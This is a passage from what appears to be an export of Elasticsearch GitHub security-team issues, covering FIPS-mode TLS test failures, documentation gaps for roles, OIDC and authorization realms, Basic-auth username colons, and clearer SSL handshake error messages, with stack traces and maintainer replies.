    at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
    at org.apache.lucene.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:54)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:375)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl.lambda$forkTimeoutingTask$0(ThreadLeakControl.java:831)
    at java.lang.Thread.run(Thread.java:834)

```","Pinging @elastic/es-security (Team:Security)Although this test is causing failures in `master`, in fact the problems lie in `7.x`. I muted this test there in e9c4b3ea0d5bc309f44c6f407022aece53a45e15.",no,">test-failure,:Security/Security,Team:Security,"
elastic/elasticsearch,1233417492,"[DOC]Consider adding API sample to create role for sql permission.","### Elasticsearch Version

8.2.0

### Installed Plugins

_No response_

### Java Version

_bundled_

### OS Version

N/A

### Problem Description

https://www.elastic.co/guide/en/elasticsearch/reference/current/sql-security.html#sql-security-permissions has this sample for role and it needs to be defined in role_mapping.yml, which is not so useful.
Because as https://www.elastic.co/guide/en/elasticsearch/reference/current/mapping-roles.html says below, you can not verify it.

>You cannot view, edit, or remove any roles that are defined in the role mapping files by using the role mapping APIs.

```
cli_or_drivers_minimal:
  cluster:
    - ""cluster:monitor/main""
  indices:
    - names: test
      privileges: [read, ""indices:admin/get""]
    - names: bort
      privileges: [read, ""indices:admin/get""]
```

Maybe it is better to replace with API example like this one.

https://discuss.elastic.co/t/is-there-a-way-to-change-the-default-security-roles/202749

### Steps to Reproduce

N/A

### Logs (if relevant)

_No response_","Pinging @elastic/es-security (Team:Security)This sounds like a doc issue, not necessarily a bug. So I'll change the label to reflect it.

Also, I believe the issue is with file-based ""role"" not file-based ""role-mapping"". That is, the 2nd link in the original post should be https://www.elastic.co/guide/en/elasticsearch/reference/current/defining-roles.html#roles-management-filePinging @elastic/es-docs (Team:Docs)Pinging @elastic/es-ql (Team:QL)",no,">docs,:Query Languages/SQL,:Security/Authorization,Team:Docs,Team:QL,"
elastic/elasticsearch,816248303,"Colons in usernames break Basic authentication","A user has reported issues with usernames that contain colons. This is currently permitted but breaks when using Basic auth.

[RFC 7617](https://tools.ietf.org/html/rfc7617) says:

> ""The user-id and password MUST NOT contain any control characters (see ""CTL"" in Appendix B.1 of [RFC5234]). Furthermore, a user-id containing a colon character is invalid, as the first colon in a user-pass string separates user-id and password from one another; text after the first colon is part of the password. User-ids containing colons cannot be encoded in user-pass strings.""

If we ban usernames with colons it's not clear to me how to gracefully handle existing systems without Basic auth and which have usernames with colons.

","Pinging @elastic/es-security (Team:Security)I think we should just call this a docs issue.
Usernames with `:` will work for token authentication, run-as, and authorization realms.

It probably would have been better to never allow `:` in usernames, but now that we have them, I don't think it's worth disallowing them and breaking anything that is working with them.

Instead, we should make it clear in the docs that usernames with `:` will have difficulty authenticating using some schemes (including the default authentication behaviour in Kibana).

 
 Pinging @elastic/es-docs (Team:Docs)I agree with @tvernum.

We may also potentially return a detailed error message if we detect two colons in the basic auth header, so debug will be easier.",no,">docs,:Security/Authentication,Team:Docs,Team:Security,"
elastic/elasticsearch,317454608,"Create apm_server user","*Original comment by @tvernum:*

The [6.2 docs for APM](https://www.elastic.co/guide/en/apm/get-started/6.2/install-and-run.html) say:

> If you are using an X-Pack secured version of Elastic Stack, you need to specify credentials in the config file before you run the commands that set up and start APM Server. For example:
```
output.elasticsearch:
  hosts: [""ElasticsearchAddress:9200""]
  username: ""elastic""
  password: ""elastic""
```

It is LINK REDACTED to being running things as ""elastic"", but we don't have an apm_server user/role to recommend instead.

We should create a builtin user+role for APM and the update the docs accordingly.","*Original comment by @tvernum:*

/CC: @elastic/apm @elastic/es-security *Original comment by @jalvz:*

fyi this has been merged recently: 
https://github.com/elastic/apm-server/pull/546

it is adapted from current beats documentation.*Original comment by @tvernum:*

@jalvz We can ship with a builtin role that already has the required privileges.
How common is it for customers to change the target indices for APM (is that even possible?)

If the standard setup uses a fixed index name, then it's better to just ship with the user + role preconfigured in X-Pack.
We don't do that for ingest (beats/logstash) because it very common to configure your own target indices, but I think we can get a better out-of-the-box experience for APM.*Original comment by @jalvz:*

Is hard to say how common it is at this point, but probably not common at all. It is possible to change it, but I don't see any reason why the should, everything works out of the box with the default names. 

A preconfigured user/role makes sense to me. See also LINK REDACTED",no,":Security/Authentication,:Security/Authorization,Team:Security,"
elastic/elasticsearch,952146146,"impossible to configure security with 0.0.0.0 config","
With this config 
network.host: 0.0.0.0

trying to run
/usr/share/elasticsearch/bin/elasticsearch-setup-passwords interactive

Getting:
Failed to establish SSL connection to elasticsearch at https://x.x.x.x:9200/_security/_authenticate?pretty.

Elasticsearch is connecting on a ip address???? Of course you will get ssl errors



PS. would also be good to have something like with curl --insecure so you can develop a container image, without the necessity to have to use development certificates.

PPS. how do you know even what ip to choose if I use multiple?

Is there some other way to configure security, without having to go through the web interface?


version: elasticsearch-7.13.4-1.x86_64","The docs for the `elasticsearch-setup-passwords` tool are [here](https://www.elastic.co/guide/en/elasticsearch/reference/current/setup-passwords.html). Try the `-u` parameter to tell the tool where to send the requests. AFAIK, all it does is automate a bunch of requests to the [security API](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-api.html). Maybe this should be added to help output? 

```
@test2 elasticsearch]# /usr/share/elasticsearch/bin/elasticsearch-setup-passwords -h
Sets the passwords for reserved users

Commands
--------
auto - Uses randomly generated passwords
interactive - Uses passwords entered by a user

Non-option arguments:
command

Option             Description
------             -----------
-E <KeyValuePair>  Configure a setting
-h, --help         Show help
-s, --silent       Show minimal output
-v, --verbose      Show verbose output
```
Why is the elasticsearch-setup-passwords with -u parameter even looking at my hostname config?

```

[@test2 elasticsearch]# /usr/share/elasticsearch/bin/elasticsearch-setup-passwords auto -u 'http://localhost:9200'
Exception in thread ""main"" java.lang.IllegalArgumentException: Could not resolve placeholder 'ELASTIC_HN'
     at org.elasticsearch.common.settings.PropertyPlaceholder.parseStringValue(PropertyPlaceholder.java:105)
     at org.elasticsearch.common.settings.PropertyPlaceholder.replacePlaceholders(PropertyPlaceholder.java:58)
     at org.elasticsearch.common.settings.Settings$Builder.replacePropertyPlaceholders(Settings.java:1167)
     at org.elasticsearch.common.settings.Settings$Builder.replacePropertyPlaceholders(Settings.java:1123)
     at org.elasticsearch.node.InternalSettingsPreparer.initializeSettings(InternalSettingsPreparer.java:97)
     at org.elasticsearch.node.InternalSettingsPreparer.prepareEnvironment(InternalSettingsPreparer.java:79)
     at org.elasticsearch.cli.EnvironmentAwareCommand.createEnv(EnvironmentAwareCommand.java:89)
     at org.elasticsearch.cli.EnvironmentAwareCommand.createEnv(EnvironmentAwareCommand.java:80)
     at org.elasticsearch.cli.EnvironmentAwareCommand.execute(EnvironmentAwareCommand.java:75)
     at org.elasticsearch.cli.Command.mainWithoutErrorHandling(Command.java:116)
     at org.elasticsearch.cli.MultiCommand.execute(MultiCommand.java:80)
     at org.elasticsearch.cli.Command.mainWithoutErrorHandling(Command.java:116)
     at org.elasticsearch.cli.Command.main(Command.java:79)
     at org.elasticsearch.xpack.security.authc.esnative.tool.SetupPasswordTool.main(SetupPasswordTool.java:117)
```
Hi, thanks very much for your interest in Elasticsearch.

`elasticsearch-setup-passwords` is a multi-command which has implications for the way options work. You will get help on the `--url` option if you call `elasticsearch-setup-passwords interactive -h`.
It would indeed be preferable for that help to be provided when you pass `elasticsearch-setup-passwords -h`, but making those changes hasn't been a priority given it is covered by the online documentation.

Setup passwords always loads your elasticsearch configuration - it needs to in order to determine things such as SSL configurations and the bootstrap password. If your configuration cannot be loaded, then the tool will fail.

Ultimately, setup-passwords is a utility to assist with the first steps in setting up a cluster. The documentation covers how to use it, as well as other options for configuring the passwords in your cluster.

Though there are some possible improvements we could make here, I don't think there is a bug, per se.  
Perhaps we can move this discussion to the [Elasticsearch forums](https://discuss.elastic.co/c/elastic-stack/elasticsearch/6), where we can provide better support.
  Pinging @elastic/es-security (Team:Security)
> `elasticsearch-setup-passwords` is a multi-command which has implications for the way options work. You will get help on the `--url` option if you call `elasticsearch-setup-passwords interactive -h`.
> It would indeed be preferable for that help to be provided when you pass `elasticsearch-setup-passwords -h`, but making those changes hasn't been a priority given it is covered by the online documentation.
> 
I would make it priority to put them here. After al this were people are getting there info first, not? Besides in the online docs that I was looking at it was not mentioned..

> Setup passwords always loads your elasticsearch configuration - it needs to in order to determine things such as SSL configurations and the bootstrap password. If your configuration cannot be loaded, then the tool will fail.
> 
So remove this from the code, this is not necessary when specifying a url.


> 
> Though there are some possible improvements we could make here, I don't think there is a bug, per se.
I would say if someone codes to use an ip address in a url and also codes validation on a certificate, classifies as bug don't you?

",no,">bug,:Security/Authentication,Team:Security,"
elastic/elasticsearch,678286809,"[DOCS] OIDC (OpenID Connect) docs to contain common errors and solutions","https://www.elastic.co/guide/en/cloud/current/ec-secure-clusters-oidc.html#ec-oidc-user-settings

Example of an error that is pretty straightforward - though I think we need a more substantial list here:
```
Likely root cause: java.nio.file.NoSuchFileException: /usr/share/elasticsearch/config/oidc/jwkset.json at java.base/sun.nio.fs.UnixException.translateToIOException(UnixException.java:92) 
```

**Resolution:**
Populate this with a valid full path or https - in the yml file:
    xpack.security.authc.realms.oidc.okta.op.jwkset_path: oidc/jwkset.json

**_So 2 options here:_**

1) Set a full path and upload that jwkset.json file to your deployment, instructions here: https://www.elastic.co/guide/en/cloud/current/ec-secure-clusters-oidc.html#ec-oidc-user-settings ( step 4 )

2) Provide https, I see it would look something like this.
 jwk-set-uri: https://{yourOktaDomain}/oauth2/default/v1/keys
Save the changes on all nodes, restart the service


I see we do provide ""Common issues and solutions""  section for SAML e.g.: https://www.elastic.co/guide/en/elasticsearch/reference/master/trb-security-saml.html


Also - I opened this as a Feature Request with teams:doc , if this is not a correct path to open doc request please let me know","Pinging @elastic/es-security (:Security/Authentication)I agree we should have added this already. I think we can take it up in the security team to add a troubleshooting doc similar to saml",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,522904007,"SSL related tests failures with BCJSSE in FIPS 140 mode","Example build scan: https://gradle-enterprise.elastic.co/s/i5x2i3udx2ifg
```
SSLConfigurationReloaderTests#testPEMKeyConfigReloading
SSLConfigurationReloaderTests#testReloadingPEMTrustConfig
SSLReloadIntegTests#testThatSSLConfigurationReloadsOnModification
```
all fail when using BCJSSE in FIPS 140 mode. 
For
```
SSLConfigurationReloaderTests#testPEMKeyConfigReloading
SSLConfigurationReloaderTests#testReloadingPEMTrustConfig
```
the SSL handshake should fail but we would expect an exception similar to the `SSLHandshakeException` that SunJSSE throws.

```
SSLReloadIntegTests#testThatSSLConfigurationReloadsOnModification
```
shouldn't throw an exception at all. 

All three of them cause the following stacktrace
```
  2> junit.framework.AssertionFailedError: Unexpected exception type, expected SSLHandshakeException but got org.bouncycastle.tls.TlsFatalAlert: certificate_unknown(46)
        at __randomizedtesting.SeedInfo.seed([9CD1B599F6DF08E2:58A40AAB044F2230]:0)
        at org.apache.lucene.util.LuceneTestCase.expectThrows(LuceneTestCase.java:2724)
        at org.apache.lucene.util.LuceneTestCase.expectThrows(LuceneTestCase.java:2712)
        at org.elasticsearch.xpack.core.ssl.SSLConfigurationReloaderTests.lambda$testPEMKeyConfigReloading$11(SSLConfigurationReloaderTests.java:203)
        at org.elasticsearch.xpack.core.ssl.SSLConfigurationReloaderTests.validateSSLConfigurationIsReloaded(SSLConfigurationReloaderTests.java:548)
        at org.elasticsearch.xpack.core.ssl.SSLConfigurationReloaderTests.testPEMKeyConfigReloading(SSLConfigurationReloaderTests.java:210)

        Caused by:
        org.bouncycastle.tls.TlsFatalAlert: certificate_unknown(46)
            at org.bouncycastle.jsse.provider.ProvSSLSocketWrap.checkServerTrusted(ProvSSLSocketWrap.java:137)
            at org.bouncycastle.jsse.provider.ProvTlsClient$1.notifyServerCertificate(ProvTlsClient.java:263)
            at org.bouncycastle.tls.TlsUtils.processServerCertificate(TlsUtils.java:3838)
            at org.bouncycastle.tls.TlsClientProtocol.handleServerCertificate(TlsClientProtocol.java:554)
            at org.bouncycastle.tls.TlsClientProtocol.handleHandshakeMessage(TlsClientProtocol.java:434)
            at org.bouncycastle.tls.TlsProtocol.processHandshakeQueue(TlsProtocol.java:545)
            at org.bouncycastle.tls.TlsProtocol.processRecord(TlsProtocol.java:463)
            at org.bouncycastle.tls.RecordStream.readRecord(RecordStream.java:224)
            at org.bouncycastle.tls.TlsProtocol.safeReadRecord(TlsProtocol.java:686)
            at org.bouncycastle.tls.TlsProtocol.blockForHandshake(TlsProtocol.java:324)
            at org.bouncycastle.tls.TlsClientProtocol.connect(TlsClientProtocol.java:83)
            at org.bouncycastle.jsse.provider.ProvSSLSocketWrap.startHandshake(ProvSSLSocketWrap.java:595)
            at org.bouncycastle.jsse.provider.ProvSSLSocketWrap.startHandshake(ProvSSLSocketWrap.java:571)
            at org.apache.http.conn.ssl.SSLConnectionSocketFactory.createLayeredSocket(SSLConnectionSocketFactory.java:436)
            at org.apache.http.conn.ssl.SSLConnectionSocketFactory.connectSocket(SSLConnectionSocketFactory.java:384)
            at org.apache.http.impl.conn.DefaultHttpClientConnectionOperator.connect(DefaultHttpClientConnectionOperator.java:142)
            at org.apache.http.impl.conn.PoolingHttpClientConnectionManager.connect(PoolingHttpClientConnectionManager.java:374)
            at org.apache.http.impl.execchain.MainClientExec.establishRoute(MainClientExec.java:393)
            at org.apache.http.impl.execchain.MainClientExec.execute(MainClientExec.java:236)
            at org.apache.http.impl.execchain.ProtocolExec.execute(ProtocolExec.java:186)
            at org.apache.http.impl.execchain.RetryExec.execute(RetryExec.java:89)
            at org.apache.http.impl.execchain.RedirectExec.execute(RedirectExec.java:110)
            at org.apache.http.impl.client.InternalHttpClient.doExecute(InternalHttpClient.java:185)
            at org.apache.http.impl.client.CloseableHttpClient.execute(CloseableHttpClient.java:83)
            at org.apache.http.impl.client.CloseableHttpClient.execute(CloseableHttpClient.java:108)
            at org.elasticsearch.xpack.core.ssl.SSLConfigurationReloaderTests.lambda$testPEMKeyConfigReloading$9(SSLConfigurationReloaderTests.java:204)
            at org.elasticsearch.xpack.core.ssl.SSLConfigurationReloaderTests.lambda$privilegedConnect$25(SSLConfigurationReloaderTests.java:754)
            at java.base/java.security.AccessController.doPrivileged(AccessController.java:551)
            at org.elasticsearch.xpack.core.ssl.SSLConfigurationReloaderTests.privilegedConnect(SSLConfigurationReloaderTests.java:753)
            at org.elasticsearch.xpack.core.ssl.SSLConfigurationReloaderTests.lambda$testPEMKeyConfigReloading$10(SSLConfigurationReloaderTests.java:204)
            at org.apache.lucene.util.LuceneTestCase._expectThrows(LuceneTestCase.java:2842)
            at org.apache.lucene.util.LuceneTestCase.expectThrows(LuceneTestCase.java:2717)
            ... 4 more

            Caused by:
            java.security.cert.CertificateException: unable to process certificates: TrustAnchor found but certificate validation failed.
                at org.bouncycastle.jsse.provider.ProvX509TrustManager.validatePath(ProvX509TrustManager.java:213)
                at org.bouncycastle.jsse.provider.ProvX509TrustManager.checkTrusted(ProvX509TrustManager.java:144)
                at org.bouncycastle.jsse.provider.ProvX509TrustManager.checkServerTrusted(ProvX509TrustManager.java:127)
                at org.bouncycastle.jsse.provider.ProvSSLSocketWrap.checkServerTrusted(ProvSSLSocketWrap.java:133)
                ... 35 more

                Caused by:
                java.security.cert.CertPathBuilderException: TrustAnchor found but certificate validation failed.
                    at org.bouncycastle.jcajce.provider.PKIXCertPathBuilderSpi.engineBuild(Unknown Source)
                    at java.base/java.security.cert.CertPathBuilder.build(CertPathBuilder.java:297)
                    at org.bouncycastle.jsse.provider.ProvX509TrustManager.validatePath(ProvX509TrustManager.java:200)
                    ... 38 more

                    Caused by:
                    java.security.SignatureException: certificate does not verify with supplied key
                        at org.bouncycastle.jcajce.provider.X509CertificateObject.checkSignature(Unknown Source)
                        at org.bouncycastle.jcajce.provider.X509CertificateObject.verify(Unknown Source)
                        at org.bouncycastle.jcajce.provider.CertPathValidatorUtilities.verifyX509Certificate(Unknown Source)
                        at org.bouncycastle.jcajce.provider.CertPathValidatorUtilities.findTrustAnchor(Unknown Source)
                        at org.bouncycastle.jcajce.provider.PKIXCertPathBuilderSpi.build(Unknown Source)
                        ... 41 more
```

which seems to indicate that the certificate signature cannot be verified by the JSSE provider ( regardless of the trust ) which is rather unexpected. It is not entirely obvious if this fails because of BCJSSE being in FIPS mode or because of simply using BCJSSE instead of SunJSSE, as we only use BCJSSE to run our FIPS 140 tests. 

I've muted these 3 tests for now until we have a solution or resolution in place
","Pinging @elastic/es-security (:Security/Network)Another case is  `EmailSslTests#testNotificationSslSettingsOverrideSmtpSslTrust` where BouncyCastle FIPS provider throws an org.bouncycastle.tls.TLSFatalAlert instead of an SSLExceptionI also saw `org.bouncycastle.tls.TlsFatalAlert: handshake_failure(40)` in https://gradle-enterprise.elastic.co/s/ugq5y3o4yrdgq during `x-pack:plugin:security:internalClusterTest` / `testSnapshotUserRoleCanSnapshotAndSeeAllIndices`

```
./gradlew ':x-pack:plugin:security:internalClusterTest' --tests ""org.elasticsearch.xpack.security.authz.SnapshotUserRoleIntegTests.testSnapshotUserRoleCanSnapshotAndSeeAllIndices"" -Dtests.seed=F4A3DCA82E28F4F1 -Dtests.security.manager=true -Dtests.locale=tr-TR -Dtests.timezone=Etc/GMT-4 -Druntime.java=11 -Dtests.fips.enabled=true
```

Unfortunately I couldn't reproduce this locally.Thanks @dliappis !

In the above, the `handshake_failure` error is causing the cluster to not form and thus the `testSnapshotUserRoleCanSnapshotAndSeeAllIndices` fails because 

```
org.elasticsearch.cluster.metadata.ProcessClusterEventTimeoutException: failed to process cluster event (delete_repository [*]) within 30s
```

so this is not related to the kind of failures we are tracking here. 

The reproduction line is from `FieldLevelSecurityRandomTests` though. Maybe copied over from a different failure log ? > The reproduction line is from `FieldLevelSecurityRandomTests` though. Maybe copied over from a different failure log ?

Ugh my mistake, sorry. Will update the repro.I have updated the [above repro](https://github.com/elastic/elasticsearch/issues/49094#issuecomment-707554386) it doesn't reproduce locally though.

@jkakavas do you think it makes sense to track this in a separate bug?It has failed exactly once with this and I believe that the TLS exceptions might be a symptom and not the cause here. I will keep track of this for the next couple of days but since it doesn't reproduce, I don't think we should mute or track this in an issue for nowI caught a similar report as the one from @dliappis on CI this morning:

```
  2> 十月 22, 2020 5:37:02 上午 org.bouncycastle.jsse.provider.ProvTlsServer notifyAlertRaised
  2> 資訊: Server raised fatal(2) handshake_failure(40) alert: Failed to process record
  2> org.bouncycastle.tls.TlsFatalAlert: handshake_failure(40)
  2> 	at org.bouncycastle.tls.TlsProtocol.handleAlertWarningMessage(TlsProtocol.java:184)
  2> 	at org.bouncycastle.tls.TlsServerProtocol.handleAlertWarningMessage(TlsServerProtocol.java:413)
  2> 	at org.bouncycastle.tls.TlsProtocol.handleAlertMessage(TlsProtocol.java:161)
  2> 	at org.bouncycastle.tls.TlsProtocol.processAlertQueue(TlsProtocol.java:570)
  2> 	at org.bouncycastle.tls.TlsProtocol.processRecord(TlsProtocol.java:435)
  2> 	at org.bouncycastle.tls.RecordStream.readFullRecord(RecordStream.java:184)
  2> 	at org.bouncycastle.tls.TlsProtocol.safeReadFullRecord(TlsProtocol.java:727)
  2> 	at org.bouncycastle.tls.TlsProtocol.offerInput(TlsProtocol.java:1059)
  2> 	at org.bouncycastle.tls.TlsProtocol.offerInput(TlsProtocol.java:1027)
  2> 	at org.bouncycastle.jsse.provider.ProvSSLEngine.unwrap(ProvSSLEngine.java:445)
  2> 	at java.base/javax.net.ssl.SSLEngine.unwrap(SSLEngine.java:677)
  2> 	at org.elasticsearch.xpack.security.transport.nio.SSLDriver.unwrap(SSLDriver.java:178)
  2> 	at org.elasticsearch.xpack.security.transport.nio.SSLDriver.access$1300(SSLDriver.java:50)
  2> 	at org.elasticsearch.xpack.security.transport.nio.SSLDriver$RegularMode.read(SSLDriver.java:327)
  2> 	at org.elasticsearch.xpack.security.transport.nio.SSLDriver.read(SSLDriver.java:119)
  2> 	at org.elasticsearch.xpack.security.transport.nio.SSLChannelContext.read(SSLChannelContext.java:165)
  2> 	at org.elasticsearch.nio.EventHandler.handleRead(EventHandler.java:139)
  2> 	at org.elasticsearch.nio.NioSelector.handleRead(NioSelector.java:420)
  2> 	at org.elasticsearch.nio.NioSelector.processKey(NioSelector.java:246)
  2> 	at org.elasticsearch.nio.NioSelector.singleLoop(NioSelector.java:174)
  2> 	at org.elasticsearch.nio.NioSelector.runLoop(NioSelector.java:131)
  2> 	at java.base/java.lang.Thread.run(Thread.java:834)
```

with the following test failing:

```
org.elasticsearch.xpack.security.transport.ServerTransportFilterIntegrationTests > testThatConnectionToClientTypeConnectionIsRejected FAILED
    ProcessClusterEventTimeoutException[failed to process cluster event (delete_repository [*]) within 30s]
        at __randomizedtesting.SeedInfo.seed([EB44AB73D78B668B:D02A53132EE64A57]:0)
        at org.elasticsearch.cluster.service.MasterService$Batcher.lambda$onTimeout$0(MasterService.java:143)
        at java.util.ArrayList.forEach(ArrayList.java:1541)
        at org.elasticsearch.cluster.service.MasterService$Batcher.lambda$onTimeout$1(MasterService.java:142)
        at org.elasticsearch.common.util.concurrent.ThreadContext$ContextPreservingRunnable.run(ThreadContext.java:678)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
        at java.lang.Thread.run(Thread.java:834)
```

But doesn't repro for me.

`./gradlew ':x-pack:plugin:security:internalClusterTest' --tests ""org.elasticsearch.xpack.security.transport.ServerTransportFilterIntegrationTests.testThatConnectionToClientTypeConnectionIsRejected"" -Dtests.seed=EB44AB73D78B668B -Dtests.security.manager=true -Dtests.locale=zh-TW -Dtests.timezone=MET -Druntime.java=11 -Dtests.fips.enabled=true`

Build scan https://gradle-enterprise.elastic.co/s/anyrby5ddynwqThese are all unrelated to the problem this issue is tracking, so can we open a new issue so that we don't miss it? Done https://github.com/elastic/elasticsearch/issues/64044. Thank you @jkakavas.",no,">test-failure,Team:Security,:Security/FIPS,"
elastic/elasticsearch,1112475912,"[User Profiles] Audit/Telemetry APIs","The existing User Profile APIs `/_security/profile/*` currently allow features like `@mentions` & user-setting storage. For this purpose, when listing all the profiles, the ""disabled"" ones are not returned in the search.

However, for Audit & Telemetry purposes, we may need to build some APIs to provide full visibility of this feature. For instance, we may want to know how many profiles are ""disabled"" vs. ""active"" vs. ""inactive"".","Pinging @elastic/es-security (Team:Security)",no,">enhancement,:Security/Security,Team:Security,"
elastic/elasticsearch,584852561,"Enhance docs on authorization realms","In configuring-authorization-delegation.asciidoc, instead of examples we could have a section for each realm that can act as an authorization realm with the necessary configuration and caveats

i.e. The fact that LDAP and AD realms need to be configured with a `bind_dn` user is implied in other parts of the documentation where we say that only realms that support lookup can be used as authorization realms but it might not be obvious to make the connection that an LDAP/AD realm needs the bind_dn user in order to perform lookups. ","Pinging @elastic/es-security (:Security/Authentication)Pinging @elastic/es-docs (>docs)We have a rough explanation for this under `run-as`. 
https://www.elastic.co/guide/en/elasticsearch/reference/current/run-as-privilege.html#run-as-privilege

We could copy that text, but perhaps we need a section that explains ""looking up users by principal"" and link to it from both run-as and authz delegation.",no,">enhancement,>docs,:Security/Authentication,Team:Security,"
elastic/elasticsearch,317448211,"Make SSL/TLS handshake errors actionable.","*Original comment by @jordansissel:*

SSL errors in all languages are generally unhelpful for users/operators, in my experience.

Elasticsearch, for example, when there is an SSL exception, logs a 50-100-line stack trace. Embedded in this noise is some signal ""PKIX path builder problem"" that, quite honestly, no operator will understand.

We can do better.

For the past year, in my spare cycles, I have been working on solving this problem for Logstash, and I believe Elasticsearch should solve this as well. We can share the code.

As an example, when a client connects and does not trust the server:

* This is what Netty and Java's SSL engine emits as an exception (aka: Elasticsearch today):

```
io.netty.handler.codec.DecoderException: javax.net.ssl.SSLHandshakeException: General SSLEngine problem
	at io.netty.handler.codec.ByteToMessageDecoder.callDecode(ByteToMessageDecoder.java:442)
	at io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:248)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:372)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:358)
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:350)
	at io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1334)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:372)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:358)
	at io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:926)
	at io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:123)
	at io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:571)
	at io.netty.channel.nio.NioEventLoop.processSelectedKeysOptimized(NioEventLoop.java:512)
	at io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:426)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:398)
	at io.netty.util.concurrent.SingleThreadEventExecutor$5.run(SingleThreadEventExecutor.java:877)
	at io.netty.util.concurrent.DefaultThreadFactory$DefaultRunnableDecorator.run(DefaultThreadFactory.java:144)
	at java.lang.Thread.run(Thread.java:748)
Caused by: javax.net.ssl.SSLHandshakeException: General SSLEngine problem
	at sun.security.ssl.Handshaker.checkThrown(Handshaker.java:1478)
	at sun.security.ssl.SSLEngineImpl.checkTaskThrown(SSLEngineImpl.java:535)
	at sun.security.ssl.SSLEngineImpl.readNetRecord(SSLEngineImpl.java:813)
	at sun.security.ssl.SSLEngineImpl.unwrap(SSLEngineImpl.java:781)
	at javax.net.ssl.SSLEngine.unwrap(SSLEngine.java:624)
	at io.netty.handler.ssl.SslHandler.unwrap(SslHandler.java:1094)
	at io.netty.handler.ssl.SslHandler.unwrap(SslHandler.java:966)
	at io.netty.handler.ssl.SslHandler.decode(SslHandler.java:900)

	at io.netty.handler.codec.ByteToMessageDecoder.callDecode(ByteToMessageDecoder.java:411)
	... 16 more
Caused by: javax.net.ssl.SSLHandshakeException: General SSLEngine problem
	at sun.security.ssl.Alerts.getSSLException(Alerts.java:192)
	at sun.security.ssl.SSLEngineImpl.fatal(SSLEngineImpl.java:1728)
	at sun.security.ssl.Handshaker.fatalSE(Handshaker.java:304)
	at sun.security.ssl.Handshaker.fatalSE(Handshaker.java:296)
	at sun.security.ssl.ClientHandshaker.serverCertificate(ClientHandshaker.java:1514)
	at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:216)
	at sun.security.ssl.Handshaker.processLoop(Handshaker.java:1026)
	at sun.security.ssl.Handshaker$1.run(Handshaker.java:966)
	at sun.security.ssl.Handshaker$1.run(Handshaker.java:963)
	at java.security.AccessController.doPrivileged(Native Method)
	at sun.security.ssl.Handshaker$DelegatedTask.run(Handshaker.java:1416)
	at io.netty.handler.ssl.SslHandler.runDelegatedTasks(SslHandler.java:1120)
	at io.netty.handler.ssl.SslHandler.unwrap(SslHandler.java:1005)
	... 18 more
Caused by: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target
	at sun.security.validator.PKIXValidator.doBuild(PKIXValidator.java:397)
	at sun.security.validator.PKIXValidator.engineValidate(PKIXValidator.java:302)
	at sun.security.validator.Validator.validate(Validator.java:260)
	at sun.security.ssl.X509TrustManagerImpl.validate(X509TrustManagerImpl.java:324)
	at sun.security.ssl.X509TrustManagerImpl.checkTrusted(X509TrustManagerImpl.java:281)
	at sun.security.ssl.X509TrustManagerImpl.checkServerTrusted(X509TrustManagerImpl.java:136)
	at sun.security.ssl.ClientHandshaker.serverCertificate(ClientHandshaker.java:1501)
	... 26 more
Caused by: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target
	at sun.security.provider.certpath.SunCertPathBuilder.build(SunCertPathBuilder.java:141)
	at sun.security.provider.certpath.SunCertPathBuilder.engineBuild(SunCertPathBuilder.java:126)
	at java.security.cert.CertPathBuilder.build(CertPathBuilder.java:280)
	at sun.security.validator.PKIXValidator.doBuild(PKIXValidator.java:392)
	... 32 more
```

* With the prototype I have been working on, this is what is emitted instead:

```
io.netty.handler.codec.DecoderException: javax.net.ssl.SSLHandshakeException: The remote server provided an unknown/untrusted certificate chain, so the connection terminated by the client.
The local client has 105 certificates in the trust store.
Here is a network log before the failure:
